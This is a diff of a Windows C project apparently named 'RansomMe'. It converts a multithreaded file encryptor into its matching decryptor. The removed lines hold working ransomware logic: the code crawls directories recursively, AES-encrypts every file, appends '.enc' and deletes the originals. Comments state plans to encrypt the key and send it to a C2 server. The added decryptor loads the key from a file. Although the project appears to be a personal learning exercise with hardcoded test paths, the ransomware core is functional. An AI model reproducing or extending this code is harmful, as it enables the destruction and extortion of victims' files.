@@ -8,32 +8,32 @@
 #pragma comment(lib, "Advapi32.lib")
 
 // Constants
-#define CHUNK_SIZE 4096         // files will be encrypted in chunks of this size
+#define CHUNK_SIZE 4096         // files will be decrypted in chunks of this size
 #define MAX_THREADS 8           // max number of threads
 #define MIN_THREADS 1           // min number of threads
 
-// Struct with all the parameters to be passed to the FileEncryptWorker callback function
+// Struct with all the parameters to be passed to the FileDecryptWorker callback function
 typedef struct {
-    char filePath[MAX_PATH];            // path of the file to be encrypted
-    const char* cryptoFileExt;          // extension to be appended to the encrypted file
+    char filePath[MAX_PATH];            // path of the file to be decrypted
+    const char* cryptoFileExt;          // extension that is appended to the encrypted file
     HCRYPTKEY hKey;                     // encryption key
     HANDLE available;                   // signal to tell the WaitForSingleObject function that the struct is available (not being used by other thread)
-    BOOL success;                       // true if the file was successfully encrypted
-} FileEncryptTask;
+    BOOL success;                       // true if the file was successfully decrypted
+} FileDecryptTask;
 
 
-// Declairing the EncryptMyFile function to use it in the FileEncryptWorker callback function
-BOOL EncryptMyFile(const char* inputFileName, const char* cryptoFileExt, HCRYPTKEY hKey);
+// Declairing the DecryptMyFile function to use it in the FileDecryptWorker callback function
+BOOL DecryptMyFile(const char* inputFileName, const char* cryptoFileExt, HCRYPTKEY hKey);
 
 // The callback function to be called by CreateThreadpoolWork when a new work sent to the pool
-VOID CALLBACK FileEncryptWorker(PTP_CALLBACK_INSTANCE instance, PVOID parameter, PTP_WORK work) {
+VOID CALLBACK FileDecryptWorker(PTP_CALLBACK_INSTANCE instance, PVOID parameter, PTP_WORK work) {
     UNREFERENCED_PARAMETER(instance);                               // instance will not be used
     UNREFERENCED_PARAMETER(work);                                   // work will not be used
-    FileEncryptTask* taskParam = (FileEncryptTask*)parameter;       // taskParam will point to the FileEncryptTask struct
+    FileDecryptTask* taskParam = (FileDecryptTask*)parameter;       // taskParam will point to the FileDecryptTask struct
 
-    // Call EncryptMyFile with the file name, extension and encryption key
-    if (EncryptMyFile(taskParam->filePath, taskParam->cryptoFileExt, taskParam->hKey)) {
-        taskParam->success = TRUE;          // only if the encryption succeeded
+    // Call DecryptMyFile with the file name, extension and encryption key
+    if (DecryptMyFile(taskParam->filePath, taskParam->cryptoFileExt, taskParam->hKey)) {
+        taskParam->success = TRUE;          // only if the decryption succeeded
     }
 
     taskParam->filePath[0] = '\0';          // clear the file name (this is optional)
@@ -82,19 +82,65 @@ BOOL InitThreadPool(TP_CALLBACK_ENVIRON* poolEnv, PTP_CLEANUP_GROUP* cleanupgrou
     return TRUE;
 }
 
+HCRYPTKEY LoadKeyFromFile(HCRYPTPROV hCryptProv, const char* keyFileName) {
+    HCRYPTKEY hKey = 0;     // the handler to the key
+    DWORD fileSize = 0;     // the key size
+    DWORD bytesRead = 0;    // number of bytes read from the key file
+    BYTE* keyBlob = NULL;   // pointer to the key bytes
+
+    // open the key file
+    HANDLE hFile = CreateFileA(keyFileName, GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
+    if (hFile == INVALID_HANDLE_VALUE) {
+        printf("Error: Unable to open key file %s. Error Code: %lu\n", keyFileName, GetLastError());
+        return 0;
+    }
+
+    // Get the size of the key blob
+    fileSize = GetFileSize(hFile, NULL);
+    if (fileSize == INVALID_FILE_SIZE) {
+        printf("Error: Failed to get file size. Error Code: %lu\n", GetLastError());
+        CloseHandle(hFile);
+        return 0;
+    }
+
+    // Read the key blob into memory
+    keyBlob = (BYTE*)malloc(fileSize);
+    if (!keyBlob) {
+        printf("Error: Memory allocation failed.\n");
+        CloseHandle(hFile);
+        return 0;
+    }
+
+    // read the key file and store the byste in keyBlob
+    if (!ReadFile(hFile, keyBlob, fileSize, &bytesRead, NULL) || bytesRead != fileSize) {
+        printf("Error: Failed to read key file. Error Code: %lu\n", GetLastError());
+        free(keyBlob);
+        CloseHandle(hFile);
+        return 0;
+    }
+
+    CloseHandle(hFile);
+
+    // Import the key into the cryptographic provider
+    if (!CryptImportKey(hCryptProv, keyBlob, fileSize, 0, 0, &hKey)) {
+        printf("Error: CryptImportKey failed. Error Code: %lu\n", GetLastError());
+        free(keyBlob);
+        return 0;
+    }
+
+    free(keyBlob);
+    return hKey;
+}
+
 // Initialize the crypto environment, hCryptProv will point to the crypt provider and hKey to the key handler
-BOOL InitCrypto(HCRYPTPROV* hCryptProv, HCRYPTKEY* hKey) {
+BOOL InitCrypto(HCRYPTPROV* hCryptProv, HCRYPTKEY* hKey, const char* keyFile) {
     // Acquire a cryptographic provider context to use AES symmetric encryption
     if (!CryptAcquireContext(hCryptProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT)) {
         printf("Error: CryptAcquireContext failed. Error Code: %lu\n", GetLastError());
         return FALSE;
     }
-    // Generate a key for the provider using the CALG_AES_256
-    if (!CryptGenKey(*hCryptProv, CALG_AES_256, CRYPT_EXPORTABLE, hKey))
-    {
-        printf("Error: CryptGenKey failed. Error Code: %lu\n", GetLastError());
-        return FALSE;
-    }
+    // load the key from a file
+    *hKey = LoadKeyFromFile(*hCryptProv, keyFile);
 
     return TRUE;
 }
@@ -111,7 +157,7 @@ errno_t my_strcat_s(char* destinationStr, size_t MaxSize, const char* sourceStr)
 }
 
 // This just gets a timestamp
-void GetTime (ULARGE_INTEGER* time) {
+void GetTime(ULARGE_INTEGER* time) {
     FILETIME fTime;
 
     // Get the time
@@ -122,127 +168,78 @@ void GetTime (ULARGE_INTEGER* time) {
     return;
 }
 
-// this saves the key into a file, I want to change this to encrypt and send to a web server
-void PrintKey(HCRYPTPROV hCryptProv, HCRYPTKEY hKey) {
-    DWORD keyBlobSize = 0;
-    BYTE* keyBlob = NULL;
-    FILE* file = NULL;
-    const char* fileName("C:\\Users\\Tamariz\\source\\repos\\RansomMe\\x64\\Debug\\key.bin");
+// This function gets a file name, extension and key and creates an decrypted version with the new extension appended and removes the original file
+BOOL DecryptMyFile(const char* inputFileName, const char* cryptoFileExt, HCRYPTKEY hKey) {
+    HANDLE hInputFile = INVALID_HANDLE_VALUE;                   // input file handler
+    HANDLE hOutputFile = INVALID_HANDLE_VALUE;                  // output file handler
 
-    // Get the size of the key blob
-    if (!CryptExportKey(hKey, 0, PLAINTEXTKEYBLOB, 0, NULL, &keyBlobSize)) {
-        printf("Error: CryptExportKey failed. Error Code: %lu\n", GetLastError());
-        return;
-    }
+    BYTE buffer[CHUNK_SIZE];                                    // buffer to read from file, decrypt and write into file
+    DWORD bytesRead = 0, bytesWritten = 0;                      // number of bytes read/written return by CreateFile and CryptDecrypt
+    BOOL finalChunk = FALSE;                                    // flag to tell CryptDecrypt that it is the final chunk (smaller than the rest)
+    BOOL success = FALSE;                                       // flag to return success/failure
 
-    // Allocate memory for the key blob
-    keyBlob = (BYTE*)malloc(keyBlobSize);
-    if (!keyBlob) {
-        printf("Error: Memory allocation failed.\n");
-        return;
-    }
+    char outputFileName[MAX_PATH] = "";                         // output file name
+    const char* inputFileExt = strrchr(inputFileName, '.');     // this will point to the last '.' of inputFileName, where the crypted extension begins
 
-    // Export the key into the blob
-    if (!CryptExportKey(hKey, 0, PLAINTEXTKEYBLOB, 0, keyBlob, &keyBlobSize)) {
-        printf("Error: CryptExportKey failed. Error Code: %lu\n", GetLastError());
-        free(keyBlob);
-        return;
-    }
-
-    file = fopen(fileName, "wb");
-    if (!file) {
-        printf("Error: Failed to open file %s for writing.\n", fileName);
-        free(keyBlob);
-        return;
-    }
-
-    // Write the key blob to the file
-    if (fwrite(keyBlob, 1, keyBlobSize, file) != keyBlobSize) {
-        printf("Error: Failed to write the full key blob to file.\n");
-    }
+    // if the input file does not contain the crypted extension, skip the decryption
+    if (strcmp(inputFileExt, cryptoFileExt)) { goto cleanup; }
     else {
-        printf("Key successfully saved to %s\n", fileName);
-    }
+        // The outputFileName will be the inputFileName without the cryptoFileExt
+        strncpy(outputFileName, inputFileName, inputFileExt - inputFileName);
 
-    // Clean up
-    fclose(file);
-    free(keyBlob);
-}
-
-// This function gets a file name, extension and key and creates an encrypted version with the new extension appended and removes the original file
-BOOL EncryptMyFile(const char* inputFileName, const char* cryptoFileExt, HCRYPTKEY hKey) {
-    HANDLE hInputFile = INVALID_HANDLE_VALUE;       // input file handler
-    HANDLE hOutputFile = INVALID_HANDLE_VALUE;      // output file handler
-
-    BYTE buffer[CHUNK_SIZE] = {};                   // buffer to read from file, encrypt and write into file
-    DWORD bytesRead = 0, bytesWritten = 0;          // number of bytes read/written return by CreateFile and CryptEncrypt
-    BOOL finalChunk = FALSE;                        // flag to tell CryptEncrypt that it is the final chunk (smaller than the rest)
-    BOOL success = FALSE;                           // flag to return success/failure
-
-    char outputFileName[MAX_PATH] = "";             // output file name
-
-    // the output file will be the original file plus the crypted extension appended
-    strcpy_s(outputFileName, MAX_PATH, inputFileName);
-    if (my_strcat_s(outputFileName, MAX_PATH, cryptoFileExt) != 0) {
-        printf("Cannot append the crypted extension to file name %s.\n", outputFileName);
-        goto cleanup;
-    }
-
-    // Open the input file
-    hInputFile = CreateFileA(inputFileName, GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
-    if (hInputFile == INVALID_HANDLE_VALUE) {
-        printf("Error: Could not open input file %s. Error Code: %lu\n", inputFileName, GetLastError());
-        goto cleanup;
-    }
-
-    // Open the output file
-    hOutputFile = CreateFileA(outputFileName, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
-    if (hOutputFile == INVALID_HANDLE_VALUE) {
-        printf("Error: Could not open output file %s. Error Code: %lu\n", outputFileName, GetLastError());
-        goto cleanup;
-    }
-
-    // Encrypt and write the file data in chunks
-    while (ReadFile(hInputFile, buffer, CHUNK_SIZE, &bytesRead, NULL) && bytesRead > 0) {
-        finalChunk = (bytesRead < CHUNK_SIZE);  // the final chunk will be smaller thant CHUNK_SIZE
-
-        // Encrypt the chunk
-        if (!CryptEncrypt(hKey, 0, finalChunk, 0, buffer, &bytesRead, CHUNK_SIZE)) {
-            printf("Error: CryptEncrypt failed. Error Code: %lu\n", GetLastError());
-            printf("Failure encrypting file %s\n", inputFileName);
+        // Open the input file
+        hInputFile = CreateFileA(inputFileName, GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
+        if (hInputFile == INVALID_HANDLE_VALUE) {
+            printf("Error: Could not open input file. Error Code: %lu\n", GetLastError());
             goto cleanup;
         }
 
-        // Write the encrypted chunk to the output file
-        if (!WriteFile(hOutputFile, buffer, bytesRead, &bytesWritten, NULL) || bytesWritten != bytesRead) {
-            printf("Error: WriteFile failed. Error Code: %lu\n", GetLastError());
-            printf("Failure writing to file %s\n", outputFileName);
+        // Open the output file
+        hOutputFile = CreateFileA(outputFileName, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
+        if (hOutputFile == INVALID_HANDLE_VALUE) {
+            printf("Error: Could not open output file. Error Code: %lu\n", GetLastError());
             goto cleanup;
+        }
+
+        // Decrypt and write the file data in chunks
+        while (ReadFile(hInputFile, buffer, CHUNK_SIZE, &bytesRead, NULL) && bytesRead > 0) {
+            finalChunk = (bytesRead < CHUNK_SIZE);  // the final chunk will be smaller thant CHUNK_SIZE
+
+            // Decrypt the chunk
+            if (!CryptDecrypt(hKey, 0, finalChunk, 0, buffer, &bytesRead)) {
+                printf("Error: CryptDecrypt failed. Error Code: %lu\n", GetLastError());
+                goto cleanup;
+            }
+
+            // Write the decrypted chunk to the output file
+            if (!WriteFile(hOutputFile, buffer, bytesRead, &bytesWritten, NULL) || bytesWritten != bytesRead) {
+                printf("Error: WriteFile failed. Error Code: %lu\n", GetLastError());
+                goto cleanup;
+            }
         }
     }
 
-    // set success to true because the encryption went ok
+    // set success to true because the decryption went ok
     success = TRUE;
-//    printf("\rFile %s encrypted successfully.", inputFileName);
-//    fflush(stdout);
+    //    printf("\rFile %s decrypted successfully.", inputFileName);
+    //    fflush(stdout);
 
 cleanup:
-    // Release the file handlers
     if (hInputFile != INVALID_HANDLE_VALUE) CloseHandle(hInputFile);
     if (hOutputFile != INVALID_HANDLE_VALUE) CloseHandle(hOutputFile);
 
     // Delete the input file only if the decryption was successful
     if (success == TRUE) {
         if (!DeleteFileA(inputFileName)) {
-            printf("Error: Could not delete input file %s. Error Code: %lu\n", inputFileName, GetLastError());
+            printf("Error: Could not delete input file. Error Code: %lu\n", GetLastError());
         }
     }
 
     return success;
 }
 
-// given a target directory this will crawl into it and call EncryptMyFile for every file found on it and its subdirectories
-size_t EncryptAllFiles(char* targetDir, const char* cryptoFileExt, size_t* encryptedFileNumber, HCRYPTKEY hKey, TP_CALLBACK_ENVIRON* poolEnv, FileEncryptTask* taskPool) {
+// given a target directory this will crawl into it and call DecryptMyFile for every file found on it and its subdirectories
+size_t DecryptAllFiles(char* targetDir, const char* cryptoFileExt, size_t* decryptedFileNumber, HCRYPTKEY hKey, TP_CALLBACK_ENVIRON* poolEnv, FileDecryptTask* taskPool) {
     WIN32_FIND_DATAA foundFileData;          // WIN32_FIND_DATA containing the file/directory info
     HANDLE hFind = INVALID_HANDLE_VALUE;     // search handle to be used with findNextFile
 
@@ -250,10 +247,10 @@ size_t EncryptAllFiles(char* targetDir, const char* cryptoFileExt, size_t* encry
 
     char targetSubDir[MAX_PATH] = "";        // temporary variable to store the subdir
     char findTargetDir[MAX_PATH] = "";       // just to add an asterisk to the end of the targetDir but without affecting the original string
-    char fullFileName[MAX_PATH] = "";        // the full file name with path to pass to EncryptMyFile
+    char fullFileName[MAX_PATH] = "";        // the full file name with path to pass to DecryptMyFile
 
     PTP_WORK work = NULL;
-    FileEncryptTask* task = NULL;
+    FileDecryptTask* task = NULL;
 
     // if targetDir does not end with \ we will add it as it will be more convinient later
     if (targetDir[strlen(targetDir)] != '\\') {
@@ -268,7 +265,7 @@ size_t EncryptAllFiles(char* targetDir, const char* cryptoFileExt, size_t* encry
         printf("Skipping directory %s. Cannot append '*'. Name might be too long.\n", targetDir);
         return fileCount;
     }
-    
+
     // Find the first file in the directory.
     hFind = FindFirstFileA(findTargetDir, &foundFileData);
 
@@ -292,17 +289,17 @@ size_t EncryptAllFiles(char* targetDir, const char* cryptoFileExt, size_t* encry
             }
 
             // recursively call with every subfolder and add the number to the total files
-            fileCount += EncryptAllFiles(targetSubDir, cryptoFileExt, encryptedFileNumber, hKey, poolEnv, taskPool);
+            fileCount += DecryptAllFiles(targetSubDir, cryptoFileExt, decryptedFileNumber, hKey, poolEnv, taskPool);
         }
         else {
-            // If it's a file, encrypt it
+            // If it's a file, decrypt it
             // Point the next available struct to task. A round robin is used with fileCount % MAX_THREADS
             task = &taskPool[fileCount % MAX_THREADS];
             // Block until the event is signaled
             WaitForSingleObject(task->available, INFINITE);
-            
-            // Add 1 to the encrypted file count if the previous one returned success
-            if (task->success) { (*encryptedFileNumber)++; }
+
+            // Add 1 to the decrypted file count if the previous one returned success
+            if (task->success) { (*decryptedFileNumber)++; }
 
             // Mark the task as in-use by resetting the event
             ResetEvent(task->available);
@@ -315,7 +312,7 @@ size_t EncryptAllFiles(char* targetDir, const char* cryptoFileExt, size_t* encry
             }
 
             // Submit the task to the thread pool
-            work = CreateThreadpoolWork(FileEncryptWorker, task, poolEnv);
+            work = CreateThreadpoolWork(FileDecryptWorker, task, poolEnv);
             if (!work) {
                 printf("Error: Failed to create thread pool work. Error Code: %lu\n", GetLastError());
                 SetEvent(task->available);  // Mark the task as free in case of failure
@@ -324,7 +321,7 @@ size_t EncryptAllFiles(char* targetDir, const char* cryptoFileExt, size_t* encry
 
             // Submit the work
             SubmitThreadpoolWork(work);
-            
+
             fileCount++;
         }
     } while (FindNextFileA(hFind, &foundFileData) != 0);
@@ -336,26 +333,26 @@ size_t EncryptAllFiles(char* targetDir, const char* cryptoFileExt, size_t* encry
     return fileCount;
 }
 
-// this will initialize the FileEncryptTask structs and call EncryptAllFiles. Finally it will securely close the thread handlers and finish up the encrypted files count
-size_t StartEncryptionWithThreads(char* targetDir, const char* cryptoFileExt, size_t* encryptedFileNumber, HCRYPTKEY hKey, TP_CALLBACK_ENVIRON* poolEnv, PTP_CLEANUP_GROUP cleanupgroup) {
+// this will initialize the FileDecryptTask structs and call DecryptAllFiles. Finally it will securely close the thread handlers and finish up the decrypted files count
+size_t startDecryptionWithThreads(char* targetDir, const char* cryptoFileExt, size_t* decryptedFileNumber, HCRYPTKEY hKey, TP_CALLBACK_ENVIRON* poolEnv, PTP_CLEANUP_GROUP cleanupgroup) {
     size_t fileCount = 0;
-    FileEncryptTask taskPool[MAX_THREADS] = { 0 };
+    FileDecryptTask taskPool[MAX_THREADS] = { 0 };
 
     for (int i = 0; i < MAX_THREADS; i++) {
         taskPool[i].filePath[0] = '\0';                                 // initialize file path as empty
         taskPool[i].cryptoFileExt = cryptoFileExt;                      // the crypto extension
         taskPool[i].hKey = hKey;                                        // the encryption key
-        taskPool[i].success = FALSE;                                    // initialize success as false, this will be used to count the total encrypted files
+        taskPool[i].success = FALSE;                                    // initialize success as false, this will be used to count the total decrypted files
 
         // Setup an event to tell WaitForSingleObject when a struct is available
-        taskPool[i].available = CreateEvent(NULL, TRUE, TRUE, NULL);    // Manual reset, initially signaled
+        taskPool[i].available = CreateEventA(NULL, TRUE, TRUE, NULL);    // Manual reset, initially signaled
         if (!taskPool[i].available) {
             printf("Error: Failed to create event for task pool. Error Code: %lu\n", GetLastError());
             return 0;
         }
     }
 
-    fileCount = EncryptAllFiles(targetDir, cryptoFileExt, encryptedFileNumber, hKey, poolEnv, taskPool);
+    fileCount = DecryptAllFiles(targetDir, cryptoFileExt, decryptedFileNumber, hKey, poolEnv, taskPool);
 
     // Clean up the thread pool, this will wait for all callbacks to finish, even those that are waiting to start
     if (cleanupgroup) {
@@ -364,7 +361,7 @@ size_t StartEncryptionWithThreads(char* targetDir, const char* cryptoFileExt, si
 
     // Add the results from the last task of each thread
     for (int i = 0; i < MAX_THREADS; i++) {
-        if (taskPool[i].success) { (*encryptedFileNumber)++; }
+        if (taskPool[i].success) { (*decryptedFileNumber)++; }
     }
 
     return fileCount;
@@ -372,60 +369,58 @@ size_t StartEncryptionWithThreads(char* targetDir, const char* cryptoFileExt, si
 
 
 int main() {
-// this will be command parameters later
+    // this will be command parameters later
     char targetDir[MAX_PATH] = "C:\\Users\\Tamariz\\Desktop\\Test\\a";
-//    char inputFileName[MAX_PATH] = "C:\\Users\\Tamariz\\source\\repos\\RansomMe\\x64\\Debug\\test.txt";
-//    char targetDir[MAX_PATH] = "C:\\Users\\Tamariz\\Desktop\\Test";
+    //    char inputFileName[MAX_PATH] = "C:\\Users\\Tamariz\\source\\repos\\RansomMe\\x64\\Debug\\test.txt";
+    //    char targetDir[MAX_PATH] = "C:\\Users\\Tamariz\\Desktop\\Test";
     const char* cryptoFileExt = ".enc";
+    const char* keyFile = "C:\\Users\\Tamariz\\source\\repos\\RansomMe\\x64\\Debug\\key.bin";
 
-//------------- LOCAL VARIABLES -------------------------------------------------
-    // general purpose variables
+    //------------- LOCAL VARIABLES -------------------------------------------------
+        // general purpose variables
     size_t totalFileNumber = 0;                     // number of files found
-    size_t encryptedFileNumber = 0;                 // number of encrypted files
+    size_t decryptedFileNumber = 0;                 // number of decrypted files
     ULARGE_INTEGER start, end;                      // start time and end time to measure performance
 
     // thread pool variables
-    TP_CALLBACK_ENVIRON poolEnv = {};               // a pool environment struct to handle the thread pool
+    TP_CALLBACK_ENVIRON poolEnv;                    // a pool environment struct to handle the thread pool
     PTP_CLEANUP_GROUP cleanupgroup = NULL;          // a cleanup group handle to safely close all the threads in the pool
 
     // encryption variables
     HCRYPTPROV hCryptProv = 0;                      // handler for the crypto provider
     HCRYPTKEY hKey = 0;                             // handler for the encryption key
 
-//------------- INIT AND EXECUTE --------------------------------------------------
-    // Initialize the thread pool. This will create a thread pool and a cleanup group
-    //   and will link them to the same pool environment handler
+    //------------- INIT AND EXECUTE --------------------------------------------------
+        // Initialize the thread pool. This will create a thread pool and a cleanup group
+        //   and will link them to the same pool environment handler
     if (!InitThreadPool(&poolEnv, &cleanupgroup)) {
         printf("Could not initialize the thread pool. Error code: %lu\n", GetLastError());
         return 0;
     }
-   
+
     // Initialize the crypto environment. This will acquire a context and generate a key
-    if (!InitCrypto(&hCryptProv, &hKey)) {
+    if (!InitCrypto(&hCryptProv, &hKey, keyFile)) {
         printf("Could not initialize the crypto environment. Error code: %lu\n", GetLastError());
         return 0;
     }
 
-    // print the key to a file (this will change to encrypt the key and send it to a C2 server
-    PrintKey(hCryptProv, hKey);
-
     // start the timer
     GetTime(&start);
 
-    totalFileNumber = StartEncryptionWithThreads(targetDir, cryptoFileExt, &encryptedFileNumber, hKey, &poolEnv, cleanupgroup);
-    
+    totalFileNumber = startDecryptionWithThreads(targetDir, cryptoFileExt, &decryptedFileNumber, hKey, &poolEnv, cleanupgroup);
+
     // end the time    
     GetTime(&end);
 
     printf("%zd files found.\n", totalFileNumber);
-    printf("%zd files encrypted.\n", encryptedFileNumber);
-    
+    printf("%zd files decrypted.\n", decryptedFileNumber);
+
     // Calculate the elapsed time in seconds
     ULONGLONG elapsedMilliseconds = (end.QuadPart - start.QuadPart) / 10000000;
     printf("Elapsed Time: %llu seconds\n", elapsedMilliseconds);
 
-//------------- CLEAN UP --------------------------------------------------------
-    // Release the encryption key
+    //------------- CLEAN UP --------------------------------------------------------
+        // Release the encryption key
     if (hKey) {
         if (!(CryptDestroyKey(hKey))) {
             printf("Error during CryptDestroyKey!. Error code: %lu\n", GetLastError());
